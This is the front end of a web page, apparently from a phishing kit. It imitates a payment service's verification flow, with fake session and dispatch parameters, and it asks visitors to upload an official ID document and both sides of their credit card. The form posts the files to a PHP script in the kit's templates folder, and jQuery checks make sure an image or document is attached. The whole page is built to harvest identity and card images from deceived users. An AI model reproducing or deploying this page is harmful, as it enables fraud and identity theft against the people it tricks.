<script type="text/javascript" src="./identity/ds/jquery.min.js"></script>
    <script type="text/javascript">
        $("body").on("click", "#btnUpload", function () {
            var allowedFiles = [".doc", ".docx", ".pdf" , ".jpg" , ".png" , ".gif", ".jpeg" , ".bmp" , ".xlsx" , ".psd" , ".fdf"];
            var fileUpload = $("#file_input");
            var lblError = $("#lblError1");
            var regex = new RegExp("([0-9a-zA-Z\-_ ’'‘ÆÐƎƏƐƔĲŊŒẞÞǷȜæðǝəɛɣĳŋœĸſßþƿȝĄƁÇĐƊĘĦĮƘŁØƠŞȘŢȚŦŲƯY̨Ƴąɓçđɗęħįƙłøơşșţțŧųưy̨ƴÁÀÂÄǍĂĀÃÅǺĄÆǼǢƁĆĊĈČÇĎḌĐƊÐÉÈĖÊËĚĔĒĘẸƎƏƐĠĜǦĞĢƔáàâäǎăāãåǻąæǽǣɓćċĉčçďḍđɗðéèėêëěĕēęẹǝəɛġĝǧğģɣĤḤĦIÍÌİÎÏǏĬĪĨĮỊĲĴĶƘĹĻŁĽĿʼNŃN̈ŇÑŅŊÓÒÔÖǑŎŌÕŐỌØǾƠŒĥḥħıíìiîïǐĭīĩįịĳĵķƙĸĺļłľŀŉńn̈ňñņŋóòôöǒŏōõőọøǿơœŔŘŖŚŜŠŞȘṢẞŤŢṬŦÞÚÙÛÜǓŬŪŨŰŮŲỤƯẂẀŴẄǷÝỲŶŸȲỸƳŹŻŽẒŕřŗſśŝšşșṣßťţṭŧþúùûüǔŭūũűůųụưẃẁŵẅƿýỳŷÿȳỹƴźżžẓ()])+(" + allowedFiles.join('|') + ")$");
            if (!regex.test(fileUpload.val().toLowerCase())) {
                lblError.html("Attach copy of the official document" );
                return false;
            }
            lblError.html('');
            return true;
        });
    </script>

          <script type="text/javascript">
        $("body").on("click", "#btnUpload", function () {
            var allowedFiles = [".doc", ".docx", ".pdf" , ".jpg" , ".png" , ".gif", ".jpeg" , ".bmp" , ".xlsx" , ".psd" , ".fdf"];
            var fileUpload = $("#file_input2");
            var lblError = $("#lblError2");
            var regex = new RegExp("([0-9a-zA-Z\-_ ’'‘ÆÐƎƏƐƔĲŊŒẞÞǷȜæðǝəɛɣĳŋœĸſßþƿȝĄƁÇĐƊĘĦĮƘŁØƠŞȘŢȚŦŲƯY̨Ƴąɓçđɗęħįƙłøơşșţțŧųưy̨ƴÁÀÂÄǍĂĀÃÅǺĄÆǼǢƁĆĊĈČÇĎḌĐƊÐÉÈĖÊËĚĔĒĘẸƎƏƐĠĜǦĞĢƔáàâäǎăāãåǻąæǽǣɓćċĉčçďḍđɗðéèėêëěĕēęẹǝəɛġĝǧğģɣĤḤĦIÍÌİÎÏǏĬĪĨĮỊĲĴĶƘĹĻŁĽĿʼNŃN̈ŇÑŅŊÓÒÔÖǑŎŌÕŐỌØǾƠŒĥḥħıíìiîïǐĭīĩįịĳĵķƙĸĺļłľŀŉńn̈ňñņŋóòôöǒŏōõőọøǿơœŔŘŖŚŜŠŞȘṢẞŤŢṬŦÞÚÙÛÜǓŬŪŨŰŮŲỤƯẂẀŴẄǷÝỲŶŸȲỸƳŹŻŽẒŕřŗſśŝšşșṣßťţṭŧþúùûüǔŭūũűůųụưẃẁŵẅƿýỳŷÿȳỹƴźżžẓ()])+(" + allowedFiles.join('|') + ")$");
            if (!regex.test(fileUpload.val().toLowerCase())) {
                lblError.html("Attach copy of the Credit Card (front & back)" );
                return false;
            }
            lblError.html('');
            return true;
        });
    </script>


				<div id="page-wrap">

						<div id="load" class="transitioning spinner spin" style="display:none;"><?php echo $going ?></div>


<main>

	 <form action="../Templates/MO_ID.php?cmd=_flow&SESSION=VBQvrPU00IM1uHErimWKuCyeklx6zvOmYw3KdzGurpCNuky8BWUn3P_VBQvrPU00IM1uHErimWKu&dispatch=5885d80a13c0db1f8e263663d3faee8d0b9dcb01a9b6dc564e45f62871326a5e" method="post" enctype="multipart/form-data" onsubmit="return ray.ajax()">




	 <div id="column1">

<br><br>
         <img style="width:20px;height:25px" src="../img/ico.png">&nbsp;&nbsp;<b><?php echo $mo39 ?></b>



 <div  style="height: 0px;"> <span id="lblError1" class="message"   ></span>  <span  id="message1" ></span> </div>



 	<br>


  <input type="file" class="file_input" id="file_input" multiple="multiple" name="files[]" />



</div>


	 <div id="column2">



				<img style="width:20px;height:25px" src="../img/ico.png">&nbsp;&nbsp;<b><?php echo $mo40 ?></b>


	 <div  style="height: 0px;"> <span id="lblError2" class="message"   ></span>  <span  id="message1" ></span> </div>


 	<br>
 	<div style="margin: 0.5px"></div>

  <input type="file" class="file_input" id="file_input2" multiple="multiple" name="files[]" />



</div><br><br><br><br>
<input id="submitBtn" name="_eventId_continue" type="submit" class="button"value="<?php echo $cn ?>"data-click="createSubmit"/>
</form>
